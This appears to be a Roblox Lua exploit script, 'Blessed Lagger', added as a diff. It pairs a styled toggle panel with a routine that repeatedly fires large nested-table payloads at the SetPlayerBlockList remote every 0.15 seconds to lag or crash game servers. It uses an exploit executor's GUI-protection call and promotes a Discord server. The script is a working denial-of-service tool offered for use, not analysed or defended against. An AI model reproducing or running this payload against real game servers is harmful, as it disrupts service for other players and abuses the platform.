@@ -1,0 +1,386 @@
+
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
+
+local localPlayer = Players.LocalPlayer
+
+local configuration = {
+	depth = 2.5,
+	attempts = 1,
+	interval = 0.15,
+}
+
+local remotePath = "RobloxReplicatedStorage.SetPlayerBlockList"
+
+local isRunning = false
+local panelGui = nil
+local mainFrame = nil
+local statusLabel = nil
+local toggleButton = nil
+local buttonBorder = nil
+local isUiLocked = false
+
+local function getRemote(path)
+	if not path or path == "" then return nil end
+	local object = game
+	local cleanPath = path:gsub("^game%.", "")
+	for segment in cleanPath:gmatch("[^%.]+") do
+		if object then object = object[segment] else return nil end
+	end
+	return object
+end
+
+local function buildRecursiveTable(depth)
+	local root = {}
+	local pointer = root
+	for _ = 1, depth do
+		local child = {}
+		pointer[1] = child
+		pointer = child
+	end
+	return root
+end
+
+local function executeSpam(depth, attempts)
+	local mainPayload = {}
+	local spamChunk = buildRecursiveTable(depth)
+
+	for i = 1, 2250 do
+		table.insert(mainPayload, spamChunk)
+		if i % 1000 == 0 then task.wait() end
+	end
+
+	local remote = getRemote(remotePath)
+	if not remote then return end
+
+	for _ = 1, attempts do
+		pcall(function()
+			if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
+				remote:FireServer(mainPayload)
+			elseif remote:IsA("RemoteFunction") then
+				remote:InvokeServer(mainPayload)
+			end
+		end)
+	end
+end
+
+local function destroyExistingGui()
+	for _, child in pairs(localPlayer.PlayerGui:GetChildren()) do
+		if child.Name == "BlessedLaggerPanel" then child:Destroy() end
+	end
+	for _, child in pairs(CoreGui:GetChildren()) do
+		if child.Name == "BlessedLaggerPanel" then child:Destroy() end
+	end
+end
+
+local function buildGui()
+	destroyExistingGui()
+
+	local COLOR_BLACK = Color3.fromRGB(0, 0, 0)
+	local COLOR_DARK = Color3.fromRGB(8, 8, 12)
+	local COLOR_PINK = Color3.fromRGB(255, 80, 180)
+	local COLOR_PINK_DIM = Color3.fromRGB(180, 40, 120)
+	local COLOR_WHITE = Color3.fromRGB(255, 255, 255)
+
+	local gui = Instance.new("ScreenGui")
+	gui.Name = "BlessedLaggerPanel"
+	gui.ResetOnSpawn = false
+	gui.IgnoreGuiInset = true
+	gui.DisplayOrder = 10
+
+	pcall(function()
+		if syn and syn.protect_gui then syn.protect_gui(gui) end
+	end)
+
+	if not pcall(function() gui.Parent = CoreGui end) then
+		gui.Parent = localPlayer:WaitForChild("PlayerGui")
+	end
+	panelGui = gui
+
+	mainFrame = Instance.new("Frame", gui)
+	mainFrame.Name = "Main"
+	mainFrame.Size = UDim2.new(0, 380, 0, 200)
+	mainFrame.Position = UDim2.new(0.5, -190, 0.5, -100)
+	mainFrame.BackgroundColor3 = COLOR_BLACK
+	mainFrame.BackgroundTransparency = 0.05
+	mainFrame.BorderSizePixel = 0
+	mainFrame.Active = true
+	mainFrame.Draggable = true
+	mainFrame.ClipsDescendants = false
+
+	Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 18)
+
+	local border = Instance.new("UIStroke", mainFrame)
+	border.Color = COLOR_PINK
+	border.Thickness = 2
+	border.Transparency = 0.3
+	border.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+	local uiScale = Instance.new("UIScale", mainFrame)
+	uiScale.Scale = 1
+
+	local function updateScale()
+		local viewportSize = workspace.CurrentCamera.ViewportSize
+		uiScale.Scale = math.clamp(viewportSize.Y / 850, 0.65, 1.35)
+	end
+	updateScale()
+	workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(updateScale)
+
+	local header = Instance.new("Frame", mainFrame)
+	header.Size = UDim2.new(1, 0, 0, 60)
+	header.BackgroundColor3 = COLOR_DARK
+	header.BorderSizePixel = 0
+	header.ZIndex = 6
+	Instance.new("UICorner", header).CornerRadius = UDim.new(0, 18)
+
+	local patch = Instance.new("Frame", header)
+	patch.Size = UDim2.new(1, 0, 0, 16)
+	patch.Position = UDim2.new(0, 0, 1, -16)
+	patch.BackgroundColor3 = COLOR_DARK
+	patch.BorderSizePixel = 0
+	patch.ZIndex = 5
+
+	local divider = Instance.new("Frame", header)
+	divider.Size = UDim2.new(1, 0, 0, 2)
+	divider.Position = UDim2.new(0, 0, 1, -2)
+	divider.BackgroundColor3 = COLOR_PINK
+	divider.BackgroundTransparency = 0.4
+	divider.BorderSizePixel = 0
+	divider.ZIndex = 7
+
+	local titleLabel = Instance.new("TextLabel", header)
+	titleLabel.Size = UDim2.new(0, 120, 1, 0)
+	titleLabel.Position = UDim2.new(0, 18, 0, 0)
+	titleLabel.BackgroundTransparency = 1
+	titleLabel.Text = "BLESSED"
+	titleLabel.TextColor3 = COLOR_WHITE
+	titleLabel.Font = Enum.Font.GothamBlack
+	titleLabel.TextSize = 20
+	titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+	titleLabel.ZIndex = 8
+
+	local subTitleLabel = Instance.new("TextLabel", header)
+	subTitleLabel.Size = UDim2.new(0, 80, 1, 0)
+	subTitleLabel.Position = UDim2.new(0, 142, 0, 5)
+	subTitleLabel.BackgroundTransparency = 1
+	subTitleLabel.Text = "LAGGER"
+	subTitleLabel.TextColor3 = COLOR_PINK
+	subTitleLabel.Font = Enum.Font.GothamBold
+	subTitleLabel.TextSize = 16
+	subTitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+	subTitleLabel.ZIndex = 8
+
+	local footerLabel = Instance.new("TextLabel", header)
+	footerLabel.Size = UDim2.new(0, 230, 0, 16)
+	footerLabel.Position = UDim2.new(0, 18, 1, -20)
+	footerLabel.BackgroundTransparency = 1
+	footerLabel.Text = "discord.gg/blessedhubb"
+	footerLabel.TextColor3 = COLOR_WHITE
+	footerLabel.TextTransparency = 0.4
+	footerLabel.Font = Enum.Font.GothamBold
+	footerLabel.TextSize = 11
+	footerLabel.TextXAlignment = Enum.TextXAlignment.Left
+	footerLabel.ZIndex = 8
+
+	statusLabel = Instance.new("TextLabel", header)
+	statusLabel.Name = "Status"
+	statusLabel.Size = UDim2.new(0, 58, 0, 28)
+	statusLabel.Position = UDim2.new(1, -98, 0, 16)
+	statusLabel.BackgroundTransparency = 0.3
+	statusLabel.BackgroundColor3 = COLOR_DARK
+	statusLabel.Text = "OFF"
+	statusLabel.TextColor3 = Color3.fromRGB(255, 85, 85)
+	statusLabel.TextSize = 14
+	statusLabel.Font = Enum.Font.GothamBold
+	statusLabel.TextXAlignment = Enum.TextXAlignment.Center
+	statusLabel.ZIndex = 9
+	Instance.new("UICorner", statusLabel).CornerRadius = UDim.new(0, 6)
+
+	local statusStroke = Instance.new("UIStroke", statusLabel)
+	statusStroke.Color = COLOR_PINK_DIM
+	statusStroke.Thickness = 2
+
+	local lockBtn = Instance.new("TextButton", header)
+	lockBtn.Size = UDim2.new(0, 30, 0, 28)
+	lockBtn.Position = UDim2.new(1, -130, 0, 16)
+	lockBtn.BackgroundColor3 = COLOR_DARK
+	lockBtn.BorderSizePixel = 0
+	lockBtn.Text = "🔓"
+	lockBtn.TextColor3 = COLOR_WHITE
+	lockBtn.TextSize = 18
+	lockBtn.Font = Enum.Font.GothamBold
+	lockBtn.ZIndex = 10
+	lockBtn.AutoButtonColor = false
+	Instance.new("UICorner", lockBtn).CornerRadius = UDim.new(0, 6)
+
+	local lockStroke = Instance.new("UIStroke", lockBtn)
+	lockStroke.Color = COLOR_PINK_DIM
+	lockStroke.Thickness = 2
+
+	local line = Instance.new("Frame", mainFrame)
+	line.Size = UDim2.new(1, -28, 0, 2)
+	line.Position = UDim2.new(0, 14, 0, 68)
+	line.BackgroundColor3 = COLOR_PINK
+	line.BackgroundTransparency = 0.5
+	line.BorderSizePixel = 0
+
+	toggleButton = Instance.new("TextButton", mainFrame)
+	toggleButton.Size = UDim2.new(1, -28, 0, 44)
+	toggleButton.Position = UDim2.new(0, 14, 0, 80)
+	toggleButton.BackgroundColor3 = COLOR_DARK
+	toggleButton.BorderSizePixel = 0
+	toggleButton.AutoButtonColor = false
+	toggleButton.Text = ""
+	Instance.new("UICorner", toggleButton).CornerRadius = UDim.new(0, 12)
+
+	buttonBorder = Instance.new("UIStroke", toggleButton)
+	buttonBorder.Color = COLOR_PINK_DIM
+	buttonBorder.Thickness = 2
+	buttonBorder.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+	local buttonLabel = Instance.new("TextLabel", toggleButton)
+	buttonLabel.Size = UDim2.new(1, -18, 1, 0)
+	buttonLabel.Position = UDim2.new(0, 12, 0, 0)
+	buttonLabel.BackgroundTransparency = 1
+	buttonLabel.Text = "LAGGER"
+	buttonLabel.TextColor3 = COLOR_WHITE
+	buttonLabel.Font = Enum.Font.GothamBold
+	buttonLabel.TextSize = 16
+	buttonLabel.TextXAlignment = Enum.TextXAlignment.Left
+	buttonLabel.ZIndex = 1
+
+	local function updateLockUI()
+		if isUiLocked then
+			lockBtn.Text = "🔒"
+			mainFrame.Draggable = false
+			lockStroke.Color = COLOR_PINK
+		else
+			lockBtn.Text = "🔓"
+			mainFrame.Draggable = true
+			lockStroke.Color = COLOR_PINK_DIM
+		end
+	end
+
+	lockBtn.MouseButton1Click:Connect(function()
+		isUiLocked = not isUiLocked
+		updateLockUI()
+	end)
+
+	local function setRunningState(state)
+		isRunning = state
+		if isRunning then
+			toggleButton.BackgroundColor3 = COLOR_PINK
+			buttonBorder.Color = COLOR_WHITE
+			statusLabel.Text = "ON"
+			statusLabel.TextColor3 = Color3.fromRGB(100, 255, 130)
+			statusLabel.BackgroundColor3 = Color3.fromRGB(20, 40, 25)
+
+			task.spawn(function()
+				while isRunning do
+					task.spawn(function() executeSpam(configuration.depth, configuration.attempts) end)
+					task.wait(configuration.interval)
+				end
+			end)
+		else
+			toggleButton.BackgroundColor3 = COLOR_DARK
+			buttonBorder.Color = COLOR_PINK_DIM
+			statusLabel.Text = "OFF"
+			statusLabel.TextColor3 = Color3.fromRGB(255, 85, 85)
+			statusLabel.BackgroundColor3 = COLOR_DARK
+		end
+	end
+
+	toggleButton.MouseButton1Click:Connect(function()
+		setRunningState(not isRunning)
+	end)
+
+	UserInputService.InputBegan:Connect(function(input, processed)
+		if processed then return end
+		if input.KeyCode == Enum.KeyCode.LeftControl then
+			mainFrame.Visible = not mainFrame.Visible
+		end
+	end)
+
+	return {
+		gui = gui,
+		main = mainFrame,
+		toggle = toggleButton,
+		status = statusLabel,
+		lock = lockBtn,
+		flip = setRunningState,
+		isActive = function() return isRunning end,
+		isLocked = function() return isUiLocked end,
+	}
+end
+
+_G.BlessedLagger = {
+	open = function()
+		if panelGui then
+			panelGui:Destroy()
+			panelGui = nil
+		end
+		return buildGui()
+	end,
+	close = function()
+		if panelGui then
+			panelGui:Destroy()
+			panelGui = nil
+		end
+	end,
+	toggle = function()
+		if panelGui and panelGui.Parent then
+			_G.BlessedLagger.close()
+		else
+			_G.BlessedLagger.open()
+		end
+	end,
+	getState = function() return isRunning end,
+	setState = function(state)
+		if panelGui and panelGui.Parent then
+			local main = panelGui:FindFirstChild("Main")
+			if main then
+				for _, child in pairs(main:GetDescendants()) do
+					if child:IsA("TextButton") and child.Text == "" and child.Size.X.Scale == 1 then
+						local currentOn = (child.BackgroundColor3 == Color3.fromRGB(255, 80, 180))
+						if (state and not currentOn) or (not state and currentOn) then
+							child:Activate()
+						end
+						break
+					end
+				end
+			end
+		end
+	end,
+	setConfig = function(cfg)
+		if cfg.depth then configuration.depth = cfg.depth end
+		if cfg.attempts then configuration.attempts = cfg.attempts end
+		if cfg.interval then configuration.interval = cfg.interval end
+	end,
+	getConfig = function() return table.clone(configuration) end,
+	lock = function(state)
+		isUiLocked = (state == nil) and not isUiLocked or state
+		if panelGui and panelGui.Parent then
+			local main = panelGui:FindFirstChild("Main")
+			if main then
+				for _, child in pairs(main:GetDescendants()) do
+					if child:IsA("TextButton") and child.Text:match("[🔒🔓]") then
+						child.Text = isUiLocked and "🔒" or "🔓"
+						main.Draggable = not isUiLocked
+						local stroke = child:FindFirstChildOfClass("UIStroke")
+						if stroke then stroke.Color = isUiLocked and Color3.fromRGB(255, 80, 180) or Color3.fromRGB(180, 40, 120) end
+						break
+					end
+				end
+			end
+		end
+		return isUiLocked
+	end,
+}
+
+_G.BlessedLagger.open()
+
+print("[BLESSED LAGGER] Loaded. Press LeftControl to hide/show.")
+print("Lock/Unlock UI with the 🔒 button.")
